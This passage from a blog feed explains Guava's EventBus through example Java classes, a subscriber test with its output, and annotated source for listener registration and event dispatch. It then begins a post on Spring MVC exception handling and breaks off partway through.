<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Customer</span> <span class="keyword">extends</span> <span class="title">Person</span>  <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Customer</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getHobbies</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobbies</span><span class="params">(List&lt;String&gt; hobbies)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®šä¹‰ä¸€ä¸ª<code>Person</code>ç±»å’Œä¸€ä¸ª<code>Customer</code>ç±»ï¼Œç”¨äºæµ‹è¯•ç»§æ‰¿å…³ç³»çš„æ•æ‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventBusTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        EventBus eventBus = <span class="keyword">new</span> EventBus();</span><br><span class="line">        eventBus.register(<span class="keyword">new</span> EventBusChangeRecorder());</span><br><span class="line">        Customer customer = <span class="keyword">new</span> Customer(<span class="string">"customer"</span>, <span class="number">66</span>);</span><br><span class="line">        Person p = <span class="keyword">new</span> Person(<span class="string">"person"</span>, <span class="number">11</span>);</span><br><span class="line">        eventBus.post(customer);</span><br><span class="line">        eventBus.post(p);</span><br><span class="line">        eventBus.post(<span class="keyword">new</span> Integer(<span class="number">123</span>));</span><br><span class="line">        eventBus.post(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EventBusChangeRecorder</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recordCustomerChange</span><span class="params">(Customer customer)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"recieved change:"</span>);</span><br><span class="line">            System.out.println(<span class="string">"customer name: "</span> + customer.getName());</span><br><span class="line">            System.out.println(<span class="string">"cutomer age: "</span> + customer.getAge());</span><br><span class="line">            System.out.println(<span class="string">"\n\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueChange</span><span class="params">(Integer val)</span> </span>&#123;<span class="comment">//æ³¨æ„æ–¹æ³•çš„ç±»å‹</span></span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"val = "</span> + val);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deadEvent</span><span class="params">(DeadEvent deadEvent)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"deadEvent = "</span> + deadEvent);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hierarchy</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            <span class="comment">//will recieve all person and it's subtype</span></span><br><span class="line">            System.out.println(person);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æˆ‘çš„ç”µè„‘ä¸Šçš„æ‰§è¡Œç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">recieved change:</span><br><span class="line">customer name: customer</span><br><span class="line">cutomer age: 66</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">Person&#123;name=&apos;customer&apos;, age=66&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">Person&#123;name=&apos;person&apos;, age=11&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">val = 123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">deadEvent = DeadEvent&#123;source=EventBus&#123;default&#125;, event=Hello World&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æºç è§£æ"><a href="#æºç è§£æ" class="headerlink" title="æºç è§£æ"></a>æºç è§£æ</h3><h4 id="listeneræ³¨å†Œè¿‡ç¨‹"><a href="#listeneræ³¨å†Œè¿‡ç¨‹" class="headerlink" title="listeneræ³¨å†Œè¿‡ç¨‹"></a>listeneræ³¨å†Œè¿‡ç¨‹</h4><p><code>EventBus</code>ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡å«åš<code>subscribers</code>, è´Ÿè´£ç®¡ç†æ‰€æœ‰æ³¨å†Œè¿›æ¥çš„listener</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> SubscriberRegistry subscribers = <span class="keyword">new</span> SubscriberRegistry(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure>
<p><code>register(Object object)</code>æ–¹æ³•å°±æ˜¯è°ƒç”¨<code>subscribers</code>çš„æ³¨å†Œæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Registers all subscriber methods on &#123;<span class="doctag">@code</span> object&#125; to receive events.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object object whose subscriber methods should be registered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">  subscribers.register(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Registers all subscriber methods on the given listener object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register</span><span class="params">(Object listener)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//è§£ææ³¨è§£ï¼Œç”Ÿæˆ&lt;EventType, ListenMethod&gt;çš„multimap</span></span><br><span class="line">  Multimap&lt;Class&lt;?&gt;, Subscriber&gt; listenerMethods = findAllSubscribers(listener);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Map.Entry&lt;Class&lt;?&gt;, Collection&lt;Subscriber&gt;&gt; entry : listenerMethods.asMap().entrySet()) &#123;</span><br><span class="line">    Class&lt;?&gt; eventType = entry.getKey();</span><br><span class="line">    Collection&lt;Subscriber&gt; eventMethodsInListener = entry.getValue();</span><br><span class="line"></span><br><span class="line">    CopyOnWriteArraySet&lt;Subscriber&gt; eventSubscribers = subscribers.get(eventType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ–°å»ºæˆ–è€…æ·»åŠ åˆ°å·²æœ‰çš„äº‹ä»¶å¯¹åº”çš„Listenerä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (eventSubscribers == <span class="keyword">null</span>) &#123;</span><br><span class="line">      CopyOnWriteArraySet&lt;Subscriber&gt; newSet = <span class="keyword">new</span> CopyOnWriteArraySet&lt;Subscriber&gt;();</span><br><span class="line">      eventSubscribers =</span><br><span class="line">          MoreObjects.firstNonNull(subscribers.putIfAbsent(eventType, newSet), newSet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eventSubscribers.addAll(eventMethodsInListener);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns all subscribers for the given listener grouped by the type of event they subscribe to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Multimap&lt;Class&lt;?&gt;, Subscriber&gt; findAllSubscribers(Object listener) &#123;</span><br><span class="line">  Multimap&lt;Class&lt;?&gt;, Subscriber&gt; methodsInListener = HashMultimap.create();</span><br><span class="line">  Class&lt;?&gt; clazz = listener.getClass();</span><br><span class="line">  <span class="keyword">for</span> (Method method : getAnnotatedMethods(clazz)) &#123;<span class="comment">//æœ‰ç¼“å­˜å“¦</span></span><br><span class="line">    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();</span><br><span class="line">    Class&lt;?&gt; eventType = parameterTypes[<span class="number">0</span>];</span><br><span class="line">    methodsInListener.put(eventType, Subscriber.create(bus, listener, method));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> methodsInListener;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>subscribers</code>çš„æ³¨å†Œæ–¹æ³•ä¸­å®Œæˆäº†å¯¹æ³¨è§£<code>@Subscribe</code>çš„è§£æã€‚</p>
<h4 id="äº‹ä»¶åˆ†å‘è¿‡ç¨‹"><a href="#äº‹ä»¶åˆ†å‘è¿‡ç¨‹" class="headerlink" title="äº‹ä»¶åˆ†å‘è¿‡ç¨‹"></a>äº‹ä»¶åˆ†å‘è¿‡ç¨‹</h4><p><code>EventBus</code>çš„postæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Posts an event to all registered subscribers. This method will return successfully after the</span></span><br><span class="line"><span class="comment"> * event has been posted to all subscribers, and regardless of any exceptions thrown by</span></span><br><span class="line"><span class="comment"> * subscribers.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;If no subscribers have been subscribed for &#123;<span class="doctag">@code</span> event&#125;'s class, and &#123;<span class="doctag">@code</span> event&#125; is not</span></span><br><span class="line"><span class="comment"> * already a &#123;<span class="doctag">@link</span> DeadEvent&#125;, it will be wrapped in a DeadEvent and reposted.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event event to post.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">post</span><span class="params">(Object event)</span> </span>&#123;</span><br><span class="line">  Iterator&lt;Subscriber&gt; eventSubscribers = subscribers.getSubscribers(event);</span><br><span class="line">  <span class="keyword">if</span> (eventSubscribers.hasNext()) &#123;</span><br><span class="line">    dispatcher.dispatch(event, eventSubscribers);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(event <span class="keyword">instanceof</span> DeadEvent)) &#123;</span><br><span class="line">    <span class="comment">// the event had no subscribers and was not itself a DeadEvent</span></span><br><span class="line">    post(<span class="keyword">new</span> DeadEvent(<span class="keyword">this</span>, event));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>dispatcher</code>é»˜è®¤æ˜¯<code>Dispatcher.perThreadDispatchQueue()</code></p>
<p>å®ƒçš„<code>dispatch</code>æ–¹æ³•å®ç°å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Per-thread queue of events to dispatch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;Queue&lt;Event&gt;&gt; queue =</span><br><span class="line">    <span class="keyword">new</span> ThreadLocal&lt;Queue&lt;Event&gt;&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">protected</span> Queue&lt;Event&gt; <span class="title">initialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Queues.newArrayDeque();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Per-thread dispatch state, used to avoid reentrant event dispatching.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;Boolean&gt; dispatching =</span><br><span class="line">    <span class="keyword">new</span> ThreadLocal&lt;Boolean&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">protected</span> Boolean <span class="title">initialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Object event, Iterator&lt;Subscriber&gt; subscribers)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//å…¥å‚æ ¡éªŒ</span></span><br><span class="line">  checkNotNull(event);</span><br><span class="line">  checkNotNull(subscribers);</span><br><span class="line">  <span class="comment">//ä»ThreadLocalä¸­æ‹¿åˆ°é˜Ÿåˆ—</span></span><br><span class="line">  Queue&lt;Event&gt; queueForThread = queue.get();</span><br><span class="line">  <span class="comment">//å…ˆæŠŠäº‹ä»¶å…¥é˜Ÿåˆ—</span></span><br><span class="line">  queueForThread.offer(<span class="keyword">new</span> Event(event, subscribers));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dispatching.get()) &#123;</span><br><span class="line">    dispatching.set(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Event nextEvent;</span><br><span class="line">      <span class="comment">//éå†é˜Ÿåˆ—ä¸­çš„äº‹ä»¶ï¼Œå¹¶åˆ†å‘ç»™ç›¸åº”çš„è®¢é˜…è€…</span></span><br><span class="line">      <span class="keyword">while</span> ((nextEvent = queueForThread.poll()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (nextEvent.subscribers.hasNext()) &#123;</span><br><span class="line">          nextEvent.subscribers.next().dispatchEvent(nextEvent.event);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      dispatching.remove();</span><br><span class="line">      queue.remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EventBusçš„æ³¨è§£æå–ï¼ˆç®€å•çš„ç¼“å­˜ï¼‰ï¼Œæ„å»ºç›¸åº”çš„Mapï¼Œä»¥åŠäº‹ä»¶çš„åˆ†å‘è®¾è®¡åœ°éå¸¸å¥½ï¼Œæœ‰äº†ä¸€ä¸ªå¤§å‹ç³»ç»Ÿå®Œæ•´çš„é›å½¢ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://www.cnblogs.com/peida/p/EventBus.html" rel="external nofollow noopener noreferrer" target="_blank">Guavaå­¦ä¹ ç¬”è®°ï¼šEventBus - peida - åšå®¢å›­</a></p>
</li>
<li><p><a href="https://github.com/google/guava/wiki/EventBusExplained" rel="external nofollow noopener noreferrer" target="_blank">EventBusExplained Â· google/guava Wiki</a></p>
</li>
<li><p><a href="https://zh.wikipedia.org/wiki/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F" rel="external nofollow noopener noreferrer" target="_blank">è§‚å¯Ÿè€…æ¨¡å¼ - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p>
</li>
<li><p><a href="http://design-patterns.readthedocs.io/zh_CN/latest/behavioral_patterns/observer.html" rel="external nofollow noopener noreferrer" target="_blank">è§‚å¯Ÿè€…æ¨¡å¼ â€” Graphic Design Patterns</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> guava </category>
            
        </categories>
        
        
        <tags>
            
            <tag> event-bus </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring MVC ä¸­çš„å¼‚å¸¸å¤„ç†]]></title>
      <url>http://qsli.github.io/2017/01/09/Spring-mvc-exception/</url>
      <content type="html"><![CDATA[<h2 id="Spring-MVCçš„å¼‚å¸¸å¤„ç†"><a href="#Spring-MVCçš„å¼‚å¸¸å¤„ç†" class="headerlink" title="Spring MVCçš„å¼‚å¸¸å¤„ç†"></a>Spring MVCçš„å¼‚å¸¸å¤„ç†</h2><p>Springä¸­çš„å¼‚å¸¸å¤„ç†ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼Œ<em>ä¸€ç§</em>æ˜¯å®ç°<code>HandlerExceptionResolver</code>æ¥å£ï¼Œ</p>
<p>è¿™ä¸ªæ¥å£ä¸­åªæœ‰ä¸€ä¸ªæ–¹æ³•<code>resolveException</code>ï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ª<code>ModelAndView</code>çš„å¯¹è±¡; </p>
<p><em>å¦å¤–ä¸€ç§</em>æ˜¯ä½¿ç”¨<code>@ExceptionHandler</code>æ³¨è§£ä½œç”¨åœ¨æ–¹æ³•ä¸Šï¼Œæ³¨è§£çš„å€¼æ¥æŒ‡å®šè¿™ä¸ªæ–¹æ³•èƒ½å¤„ç†çš„å¼‚å¸¸çš„ç±»ï¼Œ</p>
<p>å¦‚æœæ³¨è§£çš„å€¼æ˜¯ç©ºçš„ï¼Œèƒ½å¤„ç†çš„ç±»ä»¥æ–¹æ³•çš„å‚æ•°ä¸ºå‡†ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HandlerExceptionResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try to resolve the given exception that got thrown during handler execution,</span></span><br><span class="line"><span class="comment">     * returning a &#123;<span class="doctag">@link</span> ModelAndView&#125; that represents a specific error page if appropriate.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The returned &#123;<span class="doctag">@code</span> ModelAndView&#125; may be &#123;<span class="doctag">@linkplain</span> ModelAndView#isEmpty() empty&#125;</span></span><br><span class="line"><span class="comment">     * to indicate that the exception has been resolved successfully but that no view</span></span><br><span class="line"><span class="comment">     * should be rendered, for instance by setting a status code.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler the executed handler, or &#123;<span class="doctag">@code</span> null&#125; if none chosen at the</span></span><br><span class="line"><span class="comment">     * time of the exception (for example, if multipart resolution failed)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ex the exception that got thrown during handler execution</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a corresponding &#123;<span class="doctag">@code</span> ModelAndView&#125; to forward to, or &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">     * for default processing</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ModelAndView <span class="title">resolveException</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@ExceptionHandler</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @RequestMapping methods omitted ...</span></span><br><span class="line"></span><br><span class="line">    <span 